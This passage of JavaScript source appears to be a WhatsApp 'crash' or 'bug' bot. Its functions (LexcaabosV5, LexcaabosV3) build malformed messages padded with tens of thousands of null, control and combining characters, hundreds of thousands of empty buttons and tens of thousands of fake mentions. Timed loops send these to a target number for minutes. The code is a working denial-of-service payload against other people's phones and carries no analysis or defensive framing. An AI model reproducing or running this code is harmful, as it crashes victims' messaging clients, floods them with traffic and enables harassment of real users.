                    }
                }
            }
        }
    }, {});

    await sock.relayMessage(target, {
        interactiveMessage: {
            header: {
                title: "Null",
                subtitle: "ြ ".repeat(75000),
                hasMediaAttachment: true
            },
            body: { text: "ြ ".repeat(9000) },
            footer: { text: "ြ ".repeat(9000) },
            nativeFlowMessage: {
                buttons: [{
                    name: "single_select",
                    buttonParamsJson: JSON.stringify({
                        title: "Null",
                        sections: [{
                            title: "List",
                            rows: [{ title: "Lexcaabos - Executed¿!", id: "3" }]
                        }]
                    })
                }]
            }
        }
    }, {});
}

async function LexcaabosV5(target) {
    const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
    
    const generateWAMessageFromContent = (jid, message, options) => {
        return {
            key: { id: Date.now().toString() + Math.random().toString(36).substring(2) },
            message: message
        };
    };

    const LexMsg = {
        interactiveMessage: {
            nativeFlowMessage: {
                buttons: [{
                    name: "payment_info",
                    buttonParamsJson: '{"currency":"IDR","total_amount":{"value":0,"offset":100},"reference_id":"\u0000' + Date.now() + '","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"' + '\u0000'.repeat(7500) + '","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"\u0000","key":"' + '\u0000'.repeat(7500) + '","key_type":"CPF"}}],"share_payment_status":false}'
                }]
            }
        }
    };

    const Nanas = {
        viewOnceMessage: {
            message: {
                videoMessage: {
                    mimetype: "video/mp4",
                    fileLength: "17381601",
                    title: "LexzyModss - Executed",
                    fileName: " done bos " + "ꦽ".repeat(75000),
                    fileSha256: "Jch1ImUydhA2vcB5auK8Dsc1jFHRN9ykhr2x5sr3X5c=",
                    fileEncSha256: "Jch1ImUydhA2vcB5auK8Dsc1jFHRN9ykhr2x5sr3X5c=",
                    mediaKey: "s4SdSzN3zwaZNv1+jcXtAQdCc8AIm879E9+CwdN8VfI2",
                    directPath: "/v/t62.7119-24/fake.enc",
                    mediaKeyTimestamp: "1767975195",
                    url: "https://mmg.whatsapp.net/d/fake.enc",
                    caption: "ꦾ".repeat(7000) + "ꦽ".repeat(7500)
                }
            }
        }
    };

    const Muda = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    body: {
                        text: " Lexzy Suka Nanas " + "ꦾ".repeat(7500)
                    },
                    contextInfo: {
                        stanzaId: "metawai_id",
                        forwardingScore: 999,
                        participant: target,
                        mentionedJid: Array.from({ length: 2000 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net")
                    }
                }
            }
        }
    };

    const stickers = {
        stickerMessage: {
            url: 'https://mmg.whatsapp.net/m1/v/t24/An_qcbaV8YTP-HtiB1VFAie8c-VqF4bBnMHWKN--GFd6T2GW-pQwLHQe4K4eDKCS1Fv9DZCa6RXMDsLeabNqy8RoTIekx2LtJCM-iUtOu_sdK90zdCEu1l8Wwqj3KAHrNRd1?ccb=10-5&oh=01_Q5Aa4AEbsVLrEjUg9wGPpN5mT_DeeyZp0Obyl7Cp7X5CHZ4mSA&oe=69D77DE6&_nc_sid=5e03e0&mms3=true',
            fileSha256: 'lOzzPjzVDfakRkXD9ud+N/JGUHVsmn37eqDk0UijQdA=',
            fileEncSha256: "lOzzPjzVDfakRkXD9ud+N/JGUHVsmn37eqDk0UijQdA=",
            mediaKey: Buffer.alloc(32, '').toString('base64'),
            mimetype: "image/webp",
            height: -1,
            width: 5000,
            directPath: '/m1/v/t24/An_qcbaV8YTP-HtiB1VFAie8c-VqF4bBnMHWKN--GFd6T2GW-pQwLHQe4K4eDKCS1Fv9DZCa6RXMDsLeabNqy8RoTIekx2LtJCM-iUtOu_sdK90zdCEu1l8Wwqj3KAHrNRd1?ccb=10-5&oh=01_Q5Aa4AEbsVLrEjUg9wGPpN5mT_DeeyZp0Obyl7Cp7X5CHZ4mSA&oe=69D77DE6&_nc_sid=5e03e0',
            fileLength: null,
            mediaKeyTimestamp: 1710000000,
            firstFrameLength: 999,
            firstFrameSidecar: Buffer.from([99,88,77,66,55,44,33,22,11,0]),
            isAnimated: true,
            pngThumbnail: Buffer.from([99,88,77,66,55,44,33,22,11,0]),
            contextInfo: {
                mentionedJid: [
                    "0@s.whatsapp.net",
                    ...Array.from({ length: 1999 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")
                ]
            },
            stickerSentTs: 1710000000,
            isAvatar: true,
            isAiSticker: true,
            isLottie: true,
            accessibilityLabel: "\u0000".repeat(9000),
            mediaKeyDomain: null
        }
    };

    const msg = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        imageMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7118-24/613381757_981708741479682_6415817420190586389_n.enc?ccb=11-4&oh=01_Q5Aa4AGbFJc4Yn7y_Y2gO_4l-ZyX1pyKJJpcCA_a-Wra2rY9SA&oe=69E62DD0&_nc_sid=5e03e0&mms3=true",
                            mimetype: "image/jpeg",
                            caption: "LexzyModss - Executed",
                            fileSha256: "umQsdlmP4w9dL35/1yb2Wy5x6ypLvSXUy3r7veQ/rNU=",
                            fileLength: "109951162777600",
                            height: -9999,
                            width: 9999,
                            mediaKey: "pbSAJfuBxe4QBnJO34YFyM1EX4ZABBJsmW6rhvT+5+I=",
                            fileEncSha256: "8frUJ7Tt5d1EXOSWiP/9CBdN4fP2gPV6WPE0sN/IaF4=",
                            directPath: "/v/t62.7118-24/613381757_981708741479682_6415817420190586389_n.enc?ccb=11-4&oh=01_Q5Aa4AGbFJc4Yn7y_Y2gO_4l-ZyX1pyKJJpcCA_a-Wra2rY9SA&oe=69E62DD0&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1774107894",
                            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHR0Jdi1hZV1hYjX2Xe5t7l33gsJycsOD/2c7Z////////////////CABEIAEgASAMBIgACEQEDEQH/xAAsAAACAwEBAAAAAAAAAAAAAAAABAIDBQEGAQEAAAAAAAAAAAAAAAAAAAAA/9oADAMBAAIQAxAAAADs6unZ2+aFh/SINqdLCYSpYVKXczcHeKUGr56zGNgaDMfrkKJRqNSqkK6GqjWFw2MvVwxefqbzzDetQJykmZZwN7KAS4BCYFYBYAf/xAAmEAACAgICAgICAgMAAAAAAAAAAAABAgADBBESIQUxE0EQIhVRFDJS/9oADAMBAAIRAxEAPwDGcfAugToxzYdhWCzGoW3InmczjWKU/OD5TigotHUsWsWvS6iIC4JIIYysMlllKEGbgkIEBubHe+yJhlFW5l665mRa9th3KMC+4b1oSnxcv8Y/HkolbO9PFx2vUprBfiKoS/F+P+fPW45bQ5djcyfkaxK6zMb49QGbu92TKwXr3K/hx9GZOKuUvx2Pb/SKzGxcxaG7r3skM/5+QjZmxZx/je8x6Jj4xrVQfGzK2Xk3zF5XWIHL5qplDn4LKzuxS7mQ2qyB7gNNbbdx71GX8pFrHmZkMRNFLPUx1uPHY+JbUvIb+D6n+QaPjZR2D2Vi3rqmD18jqPUn7FTorPIVepitYjA2L2Qpk1dU+ow++Zh8VcHymfc3cTNx8amC41P1B4oWU5KsjfUxLLU43sR5V5Hbtfl1M6hP8ANL4jX+iLkY0of+4s2dRYbsZMcM54HqYFZdDmVr8Tn+zMjI3ouYOFdXbYox+P2KItuID5P8A2Utj2P8A/8QAFBEBAAAAAAAAAAAAAAAAAAAAQP/aAAgBAgEBPwBP/8QAFBEBAAAAAAAAAAAAAAAAAAAAQP/aAAgBAwEBPwBP/9k=",
                            viewOnce: true,
                            scansSidecar: "ruEDZByywdU2+wxwAOMMI9TaQpJ84ehIk67v1KJjC+JGXu9u7ta4fw==",
                            scanLengths: [6677, 48757, 32501, 42353],
                            midQualityFileSha256: "qjGQcaOKUiN+pMKBMxAEeONhJR5VDFsu+iGxQ1LfmNY="
                        },
                        hasMediaAttachment: null
                    },
                    body: {
                        text: "\u0000".repeat(1000)
                    },
                    contextInfo: {
                        remoteJid: "status@broadcast",
                        participant: target,
                        isBuldo: true,
                        mentionedJid: [
                            "0@s.whatsapp.net",
                            ...Array.from({ length: 1000 * 40 }, () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net")
                        ],
                        groupMentions: [],
                        entryPointConversionSource: "non_contact",
                        entryPointConversionApp: "whatsapp",
                        entryPointConversionDelaySeconds: 467593,
                        quotedMessage: {
                            documentMessage: {
                                url: "https://example.com/file.zip",
                                mimetype: "application/zip",
                                caption: "LexzyModss - Executed",
                                fileName: "NanasMuda - Executed",
                                fileLength: 99999,
                                vCards: true
                            }
                        }
                    },
                    nativeFlowMessage: {
                        messageParamsJson: "ြ".repeat(9000)
                    }
                }
            }
        }
    };

    await sock.relayMessage("status@broadcast", Nanas, {
        messageId: null,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
            }]
        }]
    });

    await sock.relayMessage("status@broadcast", Muda, {
        messageId: null,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
            }]
        }]
    });

    const startTime = Date.now();
    const duration = 5 * 60 * 1500;

    while (Date.now() - startTime < duration) {
        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: {
                    extendedTextMessage: {
                        text: "\u0000".repeat(75000),
                        contextInfo: {
                            participant: true,
                            mentionedJid: [
                                "0@s.whatsapp.net",
                                ...Array.from({ length: 1950 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net")
                            ]
                        }
                    }
                }
            }
        }, { participant: true });
    }

    await sock.relayMessage(target, {
        groupStatusMessageV2: {
            nativeFlowMessage: {
                extendedTextMessage: {
                    text: "\u0003".repeat(9000),
                    contextInfo: {
                        participant: target,
                        mentionedJid: [
                            "0@s.whatsapp.net",
                            ...Array.from(
                                { length: 1999 },
                                () => "1" + Math.floor(Math.random() * 98000000) + "@s.whatsapp.net"
                            )
                        ]
                    }
                }
            }
        }
    }, { participant: true });

    const startTime2 = Date.now();
    const duration2 = 1 * 60 * 1000;

    while (Date.now() - startTime2 < duration2) {
        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: {
                    extendedTextMessage: {
                        text: "\u0003".repeat(75000),
                        contextInfo: {
                            participant: true,
                            mentionedJid: [
                                "0@s.whatsapp.net",
                                ...Array.from({ length: 2000 }, () => "1" + Math.floor(Math.random() * 8000000) + "@s.whatsapp.net")
                            ]
                        }
                    }
                }
            }
        }, { participant: true });
    }

    const LexzyyMsg = {
        interactiveMessage: {
            body: {
                text: "LexzyMods - Executed¿!",
            },
            nativeFlowMessage: {
                buttons: Array.from({ length: 700000 }, () => ({}))
            },
            contextInfo: {
                quotedMessage: {
                    orderMessage: {
                        orderTitle: "Pt Nanas Muda",
                        itemCount: 1999,
                        totalAmount1000: "1000000",
                        totalCurrencyCode: "IDR"
                    },
                },
            },
        },
    };

    const acamsg = generateWAMessageFromContent(target, LexzyyMsg, {});

    await sock.relayMessage(target, acamsg.message, {
        participant: true,
        messageId: acamsg.key.id
    });

    const Lexca = {
        messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
            botMetadata: {
                pluginMetadata: {},
                richResponseSourcesMetadata: {
                    sources: []
                }
            }
        },
        groupStatusMessageV2: {
            message: {
                richResponseMessage: {
                    messageType: 1,
                    submessages: [
                        {
                            messageType: 3,
                            tableMetadata: {
                                title: "LexzyMods - Executed¿!",
                                rows: Array.from({ length: 2000 }, () => ({}))
                            }
                        }
                    ],
                    unifiedResponse: {
                        data: JSON.stringify({
                            response_id: crypto.randomUUID ? crypto.randomUUID() : Date.now().toString() + Math.random().toString(36).substring(2),
                            sections: []
                        })
                    },
                    contextInfo: {
                        forwardingScore: 1,
                        isForwarded: true,
                        forwardedAiBotMessageInfo: {
                            botJid: "NanasXExecutedXAllTeam"
                        },
                        forwardOrigin: 3
                    }
                }
            }
        }
    };

    const Lexcaa = generateWAMessageFromContent(target, Lexca, {});

    await sock.relayMessage(target, Lexcaa.message, {
        participant: true,
        messageId: Lexcaa.key.id
    });

    await sock.relayMessage(target, {
        interactiveMessage: {
            nativeFlowMessage: {
                buttons: [{
                    name: "payment_info",
                    buttonParamsJson: '{"currency":"IDR","total_amount":{"value":0,"offset":100},"reference_id":"\x10' + Date.now() + '","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"' + '\u0000'.repeat(7500) + '","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"\x10","key":"' + '\u0000'.repeat(7500) + '","key_type":"CPF"}}],"share_payment_status":false}'
                }]
            }
        }
    }, {});

    await sock.relayMessage(target, {
        viewOnceMessageV2: {
            message: {
                extendedTextMessage: {
                    text: "\u0003".repeat(9000),
                    contextInfo: {
                        participant: target,
                        mentionedJid: [
                            "0@s.whatsapp.net",
                            ...Array.from(
                                { length: 2000 },
                                () => "5" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
                            )
                        ]
                    }
                }
            }
        }
    }, { participant: true });

    const Lexcabos = {
        groupStatusMessageV2: {
            message: {
                stickerPackMessage: {
                    stickerPackId: "\u0000".repeat(9000),
                    name: "LexzyMods - Executed¿!",
                    publisher: "\u0000".repeat(9000),
                    fileLength: 9999,
                    fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
                    fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
                    mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
                    mimetype: "image/webp",
                    directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
                    contextInfo: {
                        statusAttributionType: 2,
                        statusAttributions: Array.from({ length: 450000 }, () => ({ type: 1 }))
                    },
                },
            },
        },
    };

    await sock.relayMessage(target, Lexcabos, {
        participant: true,
    });

    const startTime3 = Date.now();
    const duration3 = 4 * 60 * 1000;
    while (Date.now() - startTime3 < duration3) {
        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: {
                    interactiveMessage: {
                        body: {
                            text: "Lexcaa - Executed¿!"
                        },
                        nativeFlowMessage: {
                            buttons: Array.from({ length: 500000 }, () => ({}))
                        },
                    },
                },
            },
        }, { participant: true });

        await sleep(500);

        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: "ExecutedTeam",
                            format: "DEFAULT"
                        },
                        nativeFlowResponseMessage: {
                            name: "call_permission_request",
                            paramsJson: "\u0003".repeat(9000),
                            version: 3
                        },
                    }
                }
            }
        }, { participant: true });

        await sleep(500);

        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: "NanasMuda - Executed‽!",
                            format: "DEFAULT"
                        },
                        nativeFlowResponseMessage: {
                            name: "galaxy_message",
                            paramsJson: "\x10".repeat(9000),
                            version: 3
                        },
                    }
                }
            }
        }, { participant: true });

        await sleep(500);

        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: "Lexcaabos - Executed¿!",
                            format: "DEFAULT"
                        },
                        nativeFlowResponseMessage: {
                            name: "address_message",
                            paramsJson: `{"values":{"in_pin_code":"xxx","building_name":"xxx","landmark_area":"X","address":"xxx","tower_number":"mmklu","city":"porno","name":"crb","phone_number":"xxx","house_number":"xxx","floor_number":"xxx","state":"yandex | ${"\u0000".repeat(9000)}"}}`,
                            version: 3
                        },
                        contextInfo: {
                            quotedMessage: {
                                paymentInviteMessage: {
                                    serviceType: 2,
                                    expiryTimestamp: Math.floor(Date.now() / 1999) + 8640000
                                }
                            }
                        }
                    }
                }
            }
        }, { participant: true });

        await sleep(500);

        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: {
                    extendedTextMessage: {
                        text: "\u0003".repeat(9000),
                        contextInfo: {
                            participant: true,
                            mentionedJid: [
                                "0@s.whatsapp.net",
                                ...Array.from(
                                    { length: 1999 },
                                    () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
                                )
                            ]
                        }
                    }
                }
            }
        }, { participant: true });
    }

    await sock.relayMessage(target, {
        interactiveMessage: {
            body: {
                text: "Lexcaabos - Executed¿!",
            },
            nativeFlowMessage: {
                buttons: "\u0003".repeat(9000),
            },
        },
    }, { participant: true });
}

async function LexcaabosV3(target) {
    const LexMsg = {
        interactiveMessage: {
            nativeFlowMessage: {
                buttons: [{
                    name: "payment_info",
                    buttonParamsJson: '{"currency":"IDR","total_amount":{"value":0,"offset":100},"reference_id":"\u0000' + Date.now() + '","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"' + '\u0000'.repeat(7500) + '","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"\u0000","key":"' + '\u0000'.repeat(7500) + '","key_type":"CPF"}}],"share_payment_status":false}'
                }]
            }
        }
    };

    const Nanas = {
        viewOnceMessage: {
            message: {
                videoMessage: {
                    mimetype: "video/mp4",
                    fileLength: "17381601",
                    title: "LexzyModss - Executed",
                    fileName: " done bos " + "ꦽ".repeat(75000),
                    fileSha256: "Jch1ImUydhA2vcB5auK8Dsc1jFHRN9ykhr2x5sr3X5c=",
                    fileEncSha256: "Jch1ImUydhA2vcB5auK8Dsc1jFHRN9ykhr2x5sr3X5c=",
                    mediaKey: "s4SdSzN3zwaZNv1+jcXtAQdCc8AIm879E9+CwdN8VfI2",
                    directPath: "/v/t62.7119-24/fake.enc",
                    mediaKeyTimestamp: "1767975195",
                    url: "https://mmg.whatsapp.net/d/fake.enc",
                    caption: "ꦾ".repeat(7000) + "ꦽ".repeat(7500)
                }
            }
        }
    };

    const Muda = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    body: {
                        text: " Lexzy Suka Nanas " + "ꦾ".repeat(7500)
                    },
                    contextInfo: {
                        stanzaId: "metawai_id",
                        forwardingScore: 999,
                        participant: target,
                        mentionedJid: Array.from({ length: 2000 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net")
                    }
                }
            }
        }
    };

    const stickers = {
        stickerMessage: {
            url: 'https://mmg.whatsapp.net/m1/v/t24/An_qcbaV8YTP-HtiB1VFAie8c-VqF4bBnMHWKN--GFd6T2GW-pQwLHQe4K4eDKCS1Fv9DZCa6RXMDsLeabNqy8RoTIekx2LtJCM-iUtOu_sdK90zdCEu1l8Wwqj3KAHrNRd1?ccb=10-5&oh=01_Q5Aa4AEbsVLrEjUg9wGPpN5mT_DeeyZp0Obyl7Cp7X5CHZ4mSA&oe=69D77DE6&_nc_sid=5e03e0&mms3=true',
            fileSha256: 'lOzzPjzVDfakRkXD9ud+N/JGUHVsmn37eqDk0UijQdA=',
            fileEncSha256: "lOzzPjzVDfakRkXD9ud+N/JGUHVsmn37eqDk0UijQdA=",
            mediaKey: Buffer.alloc(32, '').toString('base64'),
            mimetype: "image/webp",
            height: -1,
            width: 5000,
            directPath: '/m1/v/t24/An_qcbaV8YTP-HtiB1VFAie8c-VqF4bBnMHWKN--GFd6T2GW-pQwLHQe4K4eDKCS1Fv9DZCa6RXMDsLeabNqy8RoTIekx2LtJCM-iUtOu_sdK90zdCEu1l8Wwqj3KAHrNRd1?ccb=10-5&oh=01_Q5Aa4AEbsVLrEjUg9wGPpN5mT_DeeyZp0Obyl7Cp7X5CHZ4mSA&oe=69D77DE6&_nc_sid=5e03e0',
            fileLength: null,
            mediaKeyTimestamp: 1710000000,
            firstFrameLength: 999,
            firstFrameSidecar: Buffer.from([99,88,77,66,55,44,33,22,11,0]),
            isAnimated: true,
            pngThumbnail: Buffer.from([99,88,77,66,55,44,33,22,11,0]),
            contextInfo: {
                mentionedJid: [
                    "0@s.whatsapp.net",
                    ...Array.from({ length: 1999 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")
                ],
                interactiveAnnotations: [{
                    polygonVertices: [
                        { x: 0.1, y: 0.1 },
                        { x: 0.9, y: 0.1 },
                        { x: 0.9, y: 0.9 },
                        { x: 0.1, y: 0.9 }
                    ],
                    location: {
                        latitude: -6.2088,
                        longitude: 106.8456,
                        name: `LexzyModss - Executed`,
                    }
                }]
            },
            stickerSentTs: 1710000000,
            isAvatar: true,
            isAiSticker: true,
            isLottie: true,
            accessibilityLabel: "\u0000".repeat(9000),
            mediaKeyDomain: null
        }
    };

    const msg = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        imageMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7118-24/613381757_981708741479682_6415817420190586389_n.enc?ccb=11-4&oh=01_Q5Aa4AGbFJc4Yn7y_Y2gO_4l-ZyX1pyKJJpcCA_a-Wra2rY9SA&oe=69E62DD0&_nc_sid=5e03e0&mms3=true",
                            mimetype: "image/jpeg",
                            caption: "LexzyModss - Executed",
                            fileSha256: "umQsdlmP4w9dL35/1yb2Wy5x6ypLvSXUy3r7veQ/rNU=",
                            fileLength: "109951162777600",
                            height: -9999,
                            width: 9999,
                            mediaKey: "pbSAJfuBxe4QBnJO34YFyM1EX4ZABBJsmW6rhvT+5+I=",
                            fileEncSha256: "8frUJ7Tt5d1EXOSWiP/9CBdN4fP2gPV6WPE0sN/IaF4=",
                            directPath: "/v/t62.7118-24/613381757_981708741479682_6415817420190586389_n.enc?ccb=11-4&oh=01_Q5Aa4AGbFJc4Yn7y_Y2gO_4l-ZyX1pyKJJpcCA_a-Wra2rY9SA&oe=69E62DD0&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1774107894",
                            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHR0Jdi1hZV1hYjX2Xe5t7l33gsJycsOD/2c7Z////////////////CABEIAEgASAMBIgACEQEDEQH/xAAsAAACAwEBAAAAAAAAAAAAAAAABAIDBQEGAQEAAAAAAAAAAAAAAAAAAAAA/9oADAMBAAIQAxAAAADs6unZ2+aFh/SINqdLCYSpYVKXczcHeKUGr56zGNgaDMfrkKJRqNSqkK6GqjWFw2MvVwxefqbzzDetQJykmZZwN7KAS4BCYFYBYAf/xAAmEAACAgICAgICAgMAAAAAAAAAAAABAgADBBESIQUxE0EQIhVRFDJS/9oACAEBAAE/AMZx8C6BOjHNh2FYLMahbcieZzONYpT84PlOKCi0dSyxa9LqIgLgkghjKwyWWUoQBuGtQG5sd77ImGUVbmXrrqZFr22HcowL7hvWhKfFy/xj8eSiVs708XHa9SmsF+J+hL8T43589bjltDl2NzJ+RrErrMxvGog5v2ZUyceh6lj8VY+v6ldqvXLslVyyn0ejHL41kvJrX5LDt/oRG+Zi1nUutejJDfUGUciv46tciJUl+OCbWEttpyGPK4CZF6Y1YFL8pWWtvUnskyvhcnxuNv8AUFjWW7vmPWtzitCSvszyZqNhrXrgJiPwLkWFSB1C92WKyDsp7luG23ts/QQHdJQAe/crc1uCJjX/ACD9Tpx6lVdOhtTzMtv/AMBgoHuZdy3Wl1ErPFgSOopUNyrfUf5LG/d4QtSnrZldDPx69mFUotRFPcw6BShutP7N6nljuxGgx2sr5IjbleFmH1SZX4jKPtZ/DP8Adgn8SmxzumXirTim2pvUx2L5CFjvuZFyktYf9Elu7q3sJ+9zG7xqihUfrNjiQ1qw34y7DXiPm4Ce7Y3lcEelYzL8ul1DVJVMRwl6kiZALoKgd/bS0fHUR/UF1oGg7AQW2f8AZhJJjqi8eLb67/NTcXBn/8QAFBEBAAAAAAAAAAAAAAAAAAAAQP/aAAgBAgEBPwBP/8QAFBEBAAAAAAAAAAAAAAAAAAAAQP/aAAgBAwEBPwBP/9k=",
                            viewOnce: true,
                            scansSidecar: "ruEDZByywdU2+wxwAOMMI9TaQJp84ehIk67v1KJjC+JGXu9u7ta4fw==",
                            scanLengths: [6677, 48757, 32501, 42353],
                            midQualityFileSha256: "qjGQcaOKUiN+pMKBMxAEeONhJR5VDFsu+iGxQ1LfmNY="
                        },
                        hasMediaAttachment: null
                    },
                    body: {
                        text: "\u0000".repeat(1000)
                    },
                    contextInfo: {
                        remoteJid: "status@broadcast",
                        participant: target,
                        isBuldo: true,
                        mentionedJid: [
                            "0@s.whatsapp.net",
                            ...Array.from({ length: 1000 * 40 }, () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net")
                        ],
                        groupMentions: [],
                        entryPointConversionSource: "non_contact",
                        entryPointConversionApp: "whatsapp",
                        entryPointConversionDelaySeconds: 467593,
                        quotedMessage: {
                            documentMessage: {
                                url: "https://example.com/file.zip",
                                mimetype: "application/zip",
                                caption: "LexzyModss - Executed",
                                fileName: "NanasMuda - Executed",
                                fileLength: 99999,
                                vCards: true
                            }
                        }
                    },
                    nativeFlowMessage: {
                        messageParamsJson: "ြ".repeat(9000)
                    }
                }
            }
        }
    };

    await sock.relayMessage("status@broadcast", Nanas, {
        messageId: null,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
            }]
        }]
    });

    await sock.relayMessage("status@broadcast", Muda, {
        messageId: null,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
            }]
        }]
    });

    const startTime = Date.now();
    const duration = 5 * 60 * 1500;

    while (Date.now() - startTime < duration) {
        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: {
                    extendedTextMessage: {
                        text: "\u0000".repeat(75000),
                        contextInfo: {
                            participant: target,
                            mentionedJid: [
                                "0@s.whatsapp.net",
                                ...Array.from({ length: 1950 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net")
                            ]
                        }
                    }
                }
            }
        }, { participant: target });
    }

    await sock.relayMessage(target, {
        groupStatusMessageV2: {
            nativeFlowMessage: {
                extendedTextMessage: {
                    text: "\u0003".repeat(9000),
                    contextInfo: {
                        participant: target,
                        mentionedJid: [
                            "0@s.whatsapp.net",
                            ...Array.from(
                                { length: 1999 },
                                () => "1" + Math.floor(Math.random() * 98000000) + "@s.whatsapp.net"
                            )
                        ]
                    }
                }
            }
        }
    }, { participant: target });

    const startTime2 = Date.now();
    const duration2 = 1 * 60 * 1000;

    while (Date.now() - startTime2 < duration2) {
        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: {
                    extendedTextMessage: {
                        text: "\u0003".repeat(75000),
                        contextInfo: {
                            participant: target,
                            mentionedJid: [
                                "0@s.whatsapp.net",
                                ...Array.from({ length: 2000 }, () => "1" + Math.floor(Math.random() * 8000000) + "@s.whatsapp.net")
                            ]
                        }
                    }
                }
            }
        }, { participant: target });
    }

    const LexzyyMsg = {
        interactiveMessage: {
            body: {
                text: "LexzyMods - Executed¿!",
            },
            nativeFlowMessage: {
                buttons: Array.from({ length: 700000 }, () => ({}))
            },
            contextInfo: {
                quotedMessage: {
                    orderMessage: {
                        orderTitle: "Pt Nanas Muda",
                        itemCount: 1999,
                        totalAmount1000: "1000000",
                        totalCurrencyCode: "IDR"
                    },
                },
            },
        },
    };

    const acamsg = generateWAMessageFromContent(target, LexzyyMsg, {});

    await sock.relayMessage(target, acamsg.message, {
        participant: target,
        messageId: acamsg.key.id
    });

    const Lexca = {
        messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
            botMetadata: {
                pluginMetadata: {},
                richResponseSourcesMetadata: {
                    sources: []
                }
            }
        },
        groupStatusMessageV2: {
            message: {
                richResponseMessage: {
                    messageType: 1,
                    submessages: [
                        {
                            messageType: 3,
                            tableMetadata: {
                                title: "LexzyMods - Executed¿!",
                                rows: Array.from({ length: 2000 }, () => ({}))
                            }
                        }
                    ],
                    unifiedResponse: {
                        data: JSON.stringify({
                            response_id: crypto.randomUUID(),
                            sections: []
                        })
                    },
                    contextInfo: {
                        forwardingScore: 1,
                        isForwarded: true,
                        forwardedAiBotMessageInfo: {
                            botJid: "NanasXExecutedXAllTeam"
                        },
                        forwardOrigin: 3
                    }
                }
            }
        }
    };

    const Lexcaa = generateWAMessageFromContent(target, Lexca, {});

    await sock.relayMessage(target, Lexcaa.message, {
        participant: target,
        messageId: Lexcaa.key.id
    });

    const Lexcabos = {
        groupStatusMessageV2: {
            message: {
                stickerPackMessage: {
                    stickerPackId: "\u0000".repeat(9000),
                    name: "LexzyMods - Executed¿!",
                    publisher: "\u0000".repeat(9000),
                    fileLength: 9999,
